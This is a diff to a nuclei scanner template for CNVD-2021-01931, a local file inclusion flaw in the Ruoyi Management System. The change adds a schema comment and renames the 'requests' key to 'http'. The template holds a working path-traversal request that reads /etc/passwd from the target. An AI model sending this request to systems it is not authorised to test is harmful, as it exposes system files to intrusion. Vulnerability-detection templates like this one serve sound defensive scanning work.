@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: CNVD-2021-01931
 info:
   name: Ruoyi Management System - Local File Inclusion
@@ -11,7 +12,7 @@ info:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
     cvss-score: 8.6
     cwe-id: CWE-22
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/common/download/resource?resource=/profile/../../../../etc/passwd"
